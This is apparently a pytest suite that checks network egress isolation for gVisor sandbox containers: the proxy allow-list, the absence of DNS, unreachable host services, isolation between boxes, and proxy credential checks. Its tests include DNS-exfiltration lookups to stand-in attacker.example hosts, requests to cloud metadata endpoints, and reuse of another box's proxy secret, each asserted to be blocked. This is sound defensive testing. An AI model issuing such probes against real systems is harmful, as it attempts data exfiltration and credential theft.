"""GĐ11.45 REAL egress tests: a real gVisor box, its private internal Docker network and the real proxy container. Skipped unless AOS_REAL_SANDBOX=1 (needs Docker + runsc +
the image aos-computer, and Internet for the "allowed host works" cases - those are skipped without it). The controller (EgressCtl) runs inside this test process on a private
socket; the proxy container is a SECOND one (`aos-egress-test` on `aos-egress-out-test`), so a running development server's proxy is never touched.
Host probe server: port 8028 (0.0.0.0 on this machine) = "a host service" the box must not reach, neither through the gateway nor through the LAN address nor through the proxy.
Everything created is named aos-box-* / aos-sbx-egress-* / aos-egress-*test and is removed in `finally`; the module teardown checks nothing is left."""
import asyncio, http.server, os, shutil, socket, subprocess, sys, threading
import pytest

APP = os.path.join(os.path.dirname(__file__), "..", "app")
sys.path.insert(0, APP)
os.environ.setdefault("GOOGLE_API_KEY", "local-fake-no-calls")
import sbx_runtime as R  # noqa: E402
import egress_ctl as E  # noqa: E402

pytestmark = pytest.mark.skipif(os.environ.get("AOS_REAL_SANDBOX") != "1" or shutil.which("docker") is None, reason="needs AOS_REAL_SANDBOX=1 and a Docker CLI")
run = asyncio.run
PROBE_PORT = 8028
TEST_PROXY, TEST_OUT = "aos-egress-test", "aos-egress-out-test"

def sh(*cmd, timeout=120):
    p = subprocess.run(list(cmd), capture_output=True, text=True, timeout=timeout); return p.returncode, (p.stdout + p.stderr).strip()

def ctx(ws=1, uid=10, role="editor"): return {"ws": ws, "uid": uid, "role": role, "demo": False, "scope": "full"}

def internet_up():
    try: socket.create_connection(("pypi.org", 443), 5).close(); return True
    except OSError: return False

def host_addresses():
    """Every address of this machine a box could try: docker bridge gateways + the default-route interface address."""
    out = set()
    rc, o = sh("docker", "network", "inspect", "bridge", "-f", "{{range .IPAM.Config}}{{.Gateway}}{{end}}"); out |= {o} if rc == 0 and o else set()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s: s.connect(("192.0.2.1", 9)); out.add(s.getsockname()[0])
    except OSError: pass
    return sorted(out - {"127.0.0.1"})

@pytest.fixture(scope="module", autouse=True)
def prereqs(tmp_path_factory):
    rc, out = sh("docker", "info", "--format", "{{json .Runtimes}}")
    if rc or '"runsc"' not in out: pytest.skip("runsc is not registered in Docker")
    if sh("docker", "image", "inspect", R.IMAGE)[0]: pytest.skip(f"image {R.IMAGE} is not built")
    os.environ["AOS_EGRESS_PROXY_NAME"], os.environ["AOS_EGRESS_OUT_NET"] = TEST_PROXY, TEST_OUT
    os.environ["AOS_EGRESS_CTL_DIR"] = str(tmp_path_factory.mktemp("ctl"))
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"HOST-SERVICE-SECRET")
        def log_message(self, *a): pass
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", PROBE_PORT), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
    names = lambda *c: set(sh(*c)[1].split())                                                          # noqa: E731
    box_cmd, net_cmd = ("docker", "ps", "-a", "--filter", "label=aos.box=1", "--format", "{{.Names}}"), ("docker", "network", "ls", "--filter", "label=aos.egress.slot", "--format", "{{.Name}}")
    boxes0, nets0 = names(*box_cmd), names(*net_cmd)             # boxes / networks that already exist (a developer's own agent box) are not ours: only NEW ones count as leftovers
    yield
    srv.shutdown()
    sh("docker", "rm", "-f", TEST_PROXY); sh("docker", "network", "rm", TEST_OUT)
    for k in ("AOS_EGRESS_PROXY_NAME", "AOS_EGRESS_OUT_NET", "AOS_EGRESS_CTL_DIR"): os.environ.pop(k, None)
    left, nets = names(*box_cmd) - boxes0, names(*net_cmd) - nets0
    assert not left and not nets, f"leftover test boxes / networks: {left} {nets}"

class Lab:
    """Controller + driver + Computers on a MemStore, one per test (everything inside one event loop)."""
    def __init__(self, ceiling="custom"):
        self.store, self.sink = R.MemStore(), E.ListSink()
        for w in (1, 2): self.store.quotas[w] = {"enabled": True, "max_running": 3, "max_total": 10, "internet": ceiling}
        self.ctl = E.EgressCtl(self.store, E.DockerNet(), self.sink, demo_ws=set())
        self.drv = R.DockerGvisorDriver(); self.drv.egress = self.ctl
        self.c = R.Computers(self.store, self.drv, disk_probe=lambda: 10, egress=self.ctl)
        self.boxes = []
    async def box(self, who=None, **kw):
        r = await self.c.create(who or ctx(), **kw); self.boxes.append((who or ctx(), r["id"])); return r
    async def x(self, r, cmd, **kw): return await self.c.exec(self.boxes[[b[1] for b in self.boxes].index(r["id"])][0], r["id"], cmd, **kw)
    async def close(self):
        for who, i in self.boxes:
            try: await self.c.delete(who, i)
            except Exception as e: print("cleanup", i, e)    # noqa: BLE001
        await self.ctl.stop_server()

def lab_test(fn=None, *, ceiling="custom"):
    def deco(fn):
        def wrapper():
            async def go():
                lab = Lab(ceiling)
                try: await fn(lab)
                finally: await lab.close()
            run(go())
        wrapper.__name__ = fn.__name__; return wrapper
    return deco(fn) if fn else deco

PY_CONNECT = r'''
import socket, sys, base64, ssl, os
px = os.environ["HTTPS_PROXY"].split("@"); cred = px[0].split("//")[1]; hp = px[1].rstrip("/").split(":")
host, port, sni = sys.argv[1], int(sys.argv[2]), sys.argv[3] if len(sys.argv) > 3 else ""
if len(sys.argv) > 4: cred = sys.argv[4]
s = socket.create_connection((hp[0], int(hp[1])), 5)
s.sendall(("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: Basic %s\r\n\r\n" % (host, port, host, port, base64.b64encode(cred.encode()).decode())).encode())
head = s.recv(4096).split(b"\r\n")[0].decode()
print("PROXY:", head)
if head.split()[1] == "200" and sni:
    try:
        c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
        t = c.wrap_socket(s, server_hostname=sni); print("TLS-OK"); t.close()
    except Exception as e: print("TLS-FAILED", type(e).__name__)
'''

def pyrun(script, args):
    """bash command that runs a python script (read from a here-document) inside the box with the given arguments."""
    return "python3 - " + args + " <<'EOF'\n" + script + "\nEOF"

PY_DIRECT = r'''
import socket, sys
h, p = sys.argv[1], int(sys.argv[2])
s = socket.socket(); s.settimeout(4)
try: s.connect((h, p)); print("OPEN")
except Exception as e: print("CLOSED", type(e).__name__)
'''

@lab_test
async def test_off_box_has_no_network_at_all(lab):
    r = await lab.box(); assert "egress" not in (r["host_state"] or {})
    assert (await lab.x(r, "cat /proc/net/dev | tail -n +3 | cut -d: -f1 | tr -d ' '"))["output"].split() == ["lo"]
    res = (await lab.x(r, "curl -sS -m 5 https://pypi.org/ 2>&1; echo rc=$?"))["output"].strip(); assert not res.endswith("rc=0") and "<html" not in res.lower()
    res = (await lab.x(r, "python3 -c \"import socket;socket.create_connection(('1.1.1.1',443),3)\" 2>&1; echo rc=$?"))["output"].strip(); assert not res.endswith("rc=0")
    assert sh("docker", "inspect", "-f", "{{.HostConfig.NetworkMode}}", R.cname(r["id"]))[1] == "none"

@lab_test
async def test_internet_box_network_shape_and_no_dns_no_gateway_no_host(lab):
    r = await lab.box(internet="basic"); eg = r["host_state"]["egress"]; cn = R.cname(r["id"])
    assert sh("docker", "inspect", "-f", "{{.HostConfig.NetworkMode}}", cn)[1] == eg["net"]
    assert sh("docker", "network", "inspect", "-f", "{{.Internal}} {{index .Options \"com.docker.network.bridge.inhibit_ipv4\"}}", eg["net"])[1] == "true true"
    names = sh("docker", "network", "inspect", "-f", "{{range .Containers}}{{.Name}} {{end}}", eg["net"])[1].split()
    assert sorted(names) == sorted([cn, TEST_PROXY])                                   # exactly two endpoints: the box and the proxy (no other box, no host)
    assert sh("docker", "inspect", "-f", "{{.HostConfig.Runtime}}", cn)[1] == "runsc" and sh("docker", "inspect", "-f", "{{.HostConfig.Privileged}}", cn)[1] == "false"
    ip = (await lab.x(r, "python3 - <<'EOF'\nimport socket,fcntl,struct\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nprint(socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',b'eth0'))[20:24]))\nEOF"))["output"].strip()
    assert ip == eg["ip"]
    # DNS: no resolver answers (the configured one is TEST-NET-1, there is no route off the /30)
    assert "192.0.2.1" in (await lab.x(r, "cat /etc/resolv.conf"))["output"] or "127.0.0.11" in (await lab.x(r, "cat /etc/resolv.conf"))["output"]
    for cmd in ("getent hosts example.com", "getent hosts pypi.org", "getent hosts a1b2c3.exfil.attacker.example", "python3 -c \"import socket;socket.gethostbyname('x.attacker.example')\""):
        res = await lab.x(r, "env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy " + cmd, timeout=40)
        assert res["exit_code"] != 0, cmd
    udp = await lab.x(r, "python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(3);s.sendto(b'x',('8.8.8.8',53));print(s.recvfrom(100))\"")
    assert udp["exit_code"] != 0                                                         # no resolver and no route: a DNS query to a real resolver cannot leave
    for h in host_addresses() + ["172.17.0.1", "172.31.250.1", eg["proxy_ip"]]:        # direct connections (no proxy): the host, its LAN address, the docker gateways, the proxy's other ports
        assert "CLOSED" in (await lab.x(r, pyrun(PY_DIRECT, f"{h} {PROBE_PORT}")))["output"], h
    for port in (5432, 8020, 22):
        for h in host_addresses():
            assert "CLOSED" in (await lab.x(r, pyrun(PY_DIRECT, f"{h} {port}")))["output"], (h, port)

@lab_test
async def test_allowed_host_works_and_unlisted_is_refused(lab):
    if not internet_up(): pytest.skip("no Internet on this machine")
    r = await lab.box(internet="basic")
    ok = await lab.x(r, "curl -sS -m 25 -o /dev/null -w '%{http_code}' https://pypi.org/simple/six/", timeout=60); assert ok["output"].strip().endswith("200"), ok
    for url in ("https://example.com/", "https://www.google.com/", "https://api.github.com/", "https://1.1.1.1/", "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"):
        res = await lab.x(r, f"curl -sS -m 15 -o /dev/null -w '%{{http_code}}' {url} 2>&1; true", timeout=40)
        assert not res["output"].strip().endswith("200") and ("403" in res["output"] or "refused" in res["output"].lower() or "failed" in res["output"].lower() or "000" in res["output"]), (url, res["output"])
    for host in ("example.com", "1.1.1.1", "169.254.169.254"):
        c = await lab.x(r, pyrun(PY_CONNECT, f"{host} 443")); assert "PROXY: HTTP/1.1 403" in c["output"], (host, c["output"])
    verdicts = {(x["host"], x["verdict"]) for x in lab.sink.rows}; assert ("pypi.org", "allow") in verdicts and ("example.com", "deny") in verdicts

@lab_test
async def test_pip_install_from_pypi_works_through_the_proxy(lab):
    if not internet_up(): pytest.skip("no Internet on this machine")
    r = await lab.box(internet="basic")
    res = await lab.x(r, "python3 -m venv /opt/aos-user/v && /opt/aos-user/v/bin/pip install --disable-pip-version-check -q six==1.16.0 2>&1 | tail -3; /opt/aos-user/v/bin/python -c 'import six;print(six.__version__)'", timeout=180)
    assert res["output"].strip().endswith("1.16.0"), res
    d = {x["host"] for x in lab.sink.rows if x["verdict"] == "allow"}; assert {"pypi.org", "files.pythonhosted.org"} <= d

@lab_test
async def test_host_services_are_unreachable_through_the_proxy_too(lab):
    r = await lab.box(internet="custom", allow_list=[f"{h}:{PROBE_PORT}" for h in host_addresses()] + [f"172.17.0.1:{PROBE_PORT}", "127.0.0.1:%d" % PROBE_PORT, "localhost:%d" % PROBE_PORT])
    for h in host_addresses() + ["172.17.0.1", "127.0.0.1", "localhost"]:                 # even listed, netguard refuses every internal address
        c = await lab.x(r, pyrun(PY_CONNECT, f"{h} {PROBE_PORT}")); assert "PROXY: HTTP/1.1 403" in c["output"], (h, c["output"])
        g = await lab.x(r, f"curl -sS -m 10 http://{h}:{PROBE_PORT}/ 2>&1; true"); assert "HOST-SERVICE-SECRET" not in g["output"], h
    assert {x["reason"] for x in lab.sink.rows if x["verdict"] == "deny"} <= {"blocked_address", "not_listed", "bad_host"}

@lab_test
async def test_sni_mismatch_other_workspace_credentials_and_ceiling(lab):
    if not internet_up(): pytest.skip("no Internet on this machine")
    a = await lab.box(ctx(ws=1, uid=10), internet="basic"); b = await lab.box(ctx(ws=2, uid=20), internet="basic")
    ok = await lab.x(a, pyrun(PY_CONNECT, f"pypi.org 443 pypi.org")); assert "TLS-OK" in ok["output"], ok
    bad = await lab.x(a, pyrun(PY_CONNECT, f"pypi.org 443 example.com")); assert "PROXY: HTTP/1.1 200" in bad["output"] and "TLS-FAILED" in bad["output"], bad     # SNI names another host
    eb = b["host_state"]["egress"]
    stolen = await lab.x(a, pyrun(PY_CONNECT, f"pypi.org 443 pypi.org box-{b['id']}:{eb['secret']}")); assert "PROXY: HTTP/1.1 403" in stolen["output"], stolen   # B's credential from A's address
    guess = await lab.x(a, pyrun(PY_CONNECT, f"pypi.org 443 pypi.org box-{b['id']}:wrong")); assert "PROXY: HTTP/1.1 403" in guess["output"]
    lab.store.quotas[1]["internet"] = "off"; E.REC_TTL = 0.0
    try:
        off = await lab.x(a, pyrun(PY_CONNECT, f"pypi.org 443 pypi.org")); assert "PROXY: HTTP/1.1 403" in off["output"], off      # the workspace switched Internet off: effective at once
        fine = await lab.x(b, pyrun(PY_CONNECT, f"pypi.org 443 pypi.org")); assert "TLS-OK" in fine["output"]                     # the other workspace is not affected
    finally: E.REC_TTL = 3.0

@lab_test
async def test_boxes_cannot_reach_each_other(lab):
    a = await lab.box(ctx(ws=1, uid=10), internet="basic"); b = await lab.box(ctx(ws=2, uid=20), internet="basic")
    ea, eb = a["host_state"]["egress"], b["host_state"]["egress"]
    assert ea["net"] != eb["net"] and ea["ip"] != eb["ip"]
    await lab.x(a, "mkdir -p /tmp/s && echo A-SECRET > /tmp/s/f && (nohup python3 -m http.server 9000 --directory /tmp/s --bind 0.0.0.0 >/dev/null 2>&1 &) ; sleep 1; true")
    assert "A-SECRET" in (await lab.x(a, "curl -sS -m 5 --noproxy '*' http://127.0.0.1:9000/f"))["output"]          # the listener works in its own box
    for target in (ea["ip"], eb["ip"], eb["proxy_ip"]):
        out = (await lab.x(b, f"curl -sS -m 5 --noproxy '*' http://{target}:9000/f 2>&1; true"))["output"]
        assert "A-SECRET" not in out, target
    assert "CLOSED" in (await lab.x(b, pyrun(PY_DIRECT, f"{ea['ip']} 9000")))["output"]

@lab_test
async def test_proxy_down_fails_closed_box_keeps_running_and_comes_back(lab):
    if not internet_up(): pytest.skip("no Internet on this machine")
    r = await lab.box(internet="basic")
    assert (await lab.x(r, "curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/six/"))["output"].strip().endswith("200")
    sh("docker", "stop", "-t", "1", TEST_PROXY)
    down = await lab.x(r, "curl -sS -m 8 -o /dev/null -w '%{http_code}' https://pypi.org/simple/six/ 2>&1; true", timeout=30)
    assert not down["output"].strip().endswith("200"); assert (await lab.x(r, "echo alive"))["output"].strip() == "alive"       # offline, not broken
    await lab.c.stop(ctx(), r["id"]); await lab.c.start(ctx(), r["id"])                                                    # start re-attaches / restarts the proxy
    assert (await lab.x(r, "curl -sS -m 25 -o /dev/null -w '%{http_code}' https://pypi.org/simple/six/", timeout=60))["output"].strip().endswith("200")

@lab_test
async def test_delete_removes_the_private_network(lab):
    r = await lab.box(internet="basic"); net = r["host_state"]["egress"]["net"]
    assert sh("docker", "network", "inspect", net)[0] == 0
    await lab.c.delete(ctx(), r["id"]); lab.boxes.clear()
    assert sh("docker", "network", "inspect", net)[0] != 0
